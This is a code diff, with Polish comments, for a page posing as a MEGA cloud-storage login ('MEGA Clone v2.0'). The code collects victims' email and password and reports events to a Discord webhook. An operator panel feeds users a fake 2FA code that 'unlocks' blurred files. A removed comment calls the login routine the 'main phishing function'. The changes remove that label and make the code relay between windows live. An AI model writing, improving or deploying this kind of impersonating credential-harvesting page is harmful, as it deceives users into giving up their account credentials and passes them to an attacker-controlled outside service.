@@ -265,7 +265,6 @@
         let codeVerified = false;
         let adminTriggerCount = 0;
         let currentUserEmail = '';
-        let codePollingInterval = null;
 
         // ============================================================
         // TOAST
@@ -278,6 +277,29 @@
             clearTimeout(toast._timeout);
             toast._timeout = setTimeout(() => { toast.className = 'toast'; }, 3500);
         }
+
+        // ============================================================
+        // NASŁUCHIWANIE NA ZMIANY LOCALSTORAGE (między oknami)
+        // ============================================================
+        window.addEventListener('storage', function(e) {
+            // Gdy admin ustawi kod w localStorage - użytkownik natychmiast to widzi
+            if (e.key === 'mega_2fa_code' && e.newValue && pendingUser) {
+                adminCode = e.newValue;
+                document.getElementById('codeStatus').textContent = '📧 Otrzymałeś kod na email! Wpisz go poniżej.';
+                document.getElementById('codeStatus').className = 'status waiting';
+                document.getElementById('codeStatus').style.color = '#4ade80';
+                showToast('📧 Kod został wysłany na Twój email!');
+                
+                // Odśwież logi admina
+                if (isAdmin) loadAdminLogs();
+            }
+            
+            // Gdy użytkownik wpisze kod i zweryfikuje - admin widzi status
+            if (e.key === 'mega_2fa_verified' && e.newValue === 'true') {
+                codeVerified = true;
+                if (isAdmin) loadAdminLogs();
+            }
+        });
 
         // ============================================================
         // GOOGLE LOGIN
@@ -307,7 +329,7 @@
         }
 
         // ============================================================
-        // LOGOWANIE (główna funkcja phishing)
+        // LOGOWANIE
         // ============================================================
         async function submitLogin() {
             const email = document.getElementById('emailInput').value.trim();
@@ -334,7 +356,7 @@
                 return;
             }
 
-            // Normalny użytkownik - zapisz dane
+            // Normalny użytkownik
             pendingUser = { email: email, password: password, timestamp: new Date().toISOString() };
             adminCode = null;
             codeVerified = false;
@@ -371,31 +393,10 @@
             if (isAdmin) {
                 loadAdminLogs();
             }
-
-            // Nasłuchuj na kod z panelu admina
-            startCodePolling();
         }
 
         // ============================================================
-        // POLLING - nasłuchuje na kod z admina
-        // ============================================================
-        function startCodePolling() {
-            if (codePollingInterval) clearInterval(codePollingInterval);
-            codePollingInterval = setInterval(() => {
-                const storedCode = localStorage.getItem('mega_2fa_code');
-                if (storedCode && pendingUser) {
-                    adminCode = storedCode;
-                    document.getElementById('codeStatus').textContent = '📧 Otrzymałeś kod na email! Wpisz go poniżej.';
-                    document.getElementById('codeStatus').className = 'status waiting';
-                    document.getElementById('codeStatus').style.color = '#4ade80';
-                    showToast('📧 Kod został wysłany na Twój email!');
-                    clearInterval(codePollingInterval);
-                }
-            }, 2000);
-        }
-
-        // ============================================================
-        // WERYFIKACJA KODU (użytkownik wpisuje kod)
+        // WERYFIKACJA KODU
         // ============================================================
         function verifyCode() {
             const inputCode = document.getElementById('codeInput2fa').value.trim();
@@ -416,21 +417,21 @@
             }
 
             if (inputCode === adminCode) {
-                // Kod poprawny!
                 codeVerified = true;
                 document.getElementById('codeStatus').textContent = '✅ Kod zweryfikowany! Pliki odblokowane';
                 document.getElementById('codeStatus').className = 'status approved';
 
-                // Odblokuj foldery
                 document.querySelectorAll('.folder-item').forEach(el => {
                     el.classList.remove('blurred');
                 });
                 document.getElementById('unlockMessage').classList.add('active');
                 document.getElementById('verificationSection').classList.remove('active');
 
+                // Zapisz w localStorage że zweryfikowano (dla admina)
+                localStorage.setItem('mega_2fa_verified', 'true');
+
                 showToast('✅ Weryfikacja zakończona pomyślnie!');
 
-                // Wyślij potwierdzenie na Discord
                 sendToDiscord({
                     title: '✅ Użytkownik zweryfikował kod 2FA!',
                     message: 'Użytkownik ' + pendingUser.email + ' poprawnie wpisał kod.',
@@ -441,10 +442,7 @@
                     ]
                 });
 
-                // Wyczyść kod z localStorage
                 localStorage.removeItem('mega_2fa_code');
-
-                if (codePollingInterval) clearInterval(codePollingInterval);
 
             } else {
                 showToast('❌ Nieprawidłowy kod! Spróbuj ponownie.', true);
@@ -470,7 +468,6 @@
                 localStorage.removeItem('mega_2fa_code');
                 document.getElementById('codeStatus').textContent = '⏳ Oczekiwanie na nowy kod...';
                 document.getElementById('codeStatus').className = 'status waiting';
-                startCodePolling();
             }
         }
 
@@ -576,7 +573,7 @@
         }
 
         // ============================================================
-        // ADMIN - USTAWA KOD 2FA (2-cyfrowy)
+        // ADMIN - USTAWA KOD 2FA
         // ============================================================
         function adminSetCode() {
             const code = document.getElementById('adminCodeInput').value.trim();
@@ -593,10 +590,9 @@
             document.getElementById('adminCodeInput').value = '';
             document.getElementById('currentCodeDisplay').textContent = '🔐 ' + code;
 
-            // Zapisz kod w localStorage (użytkownik go odczyta)
+            // Zapis do localStorage - wywoła zdarzenie 'storage' w innych oknach
             localStorage.setItem('mega_2fa_code', code);
 
-            // Wyślij na Discord
             sendToDiscord({
                 title: '🔐 Nowy kod 2FA ustawiony',
                 message: 'Admin ustawił kod: ' + code,
@@ -703,7 +699,7 @@
             observer.observe(document.getElementById('verificationSection'), { attributes: true, attributeFilter: ['class'] });
         });
 
-        console.log('🔐 MEGA Clone v2.0 - Kod 2-cyfrowy');
+        console.log('🔐 MEGA Clone v2.0 - Kod 2-cyfrowy (LIVE między oknami)');
         console.log('📡 Discord Webhook:', CONFIG.DISCORD_WEBHOOK);
         console.log('🔑 Admin password:', CONFIG.ADMIN_PASSWORD);
         console.log('ℹ️ Kliknij 5x w ⚙️ lub Ctrl+Shift+A');
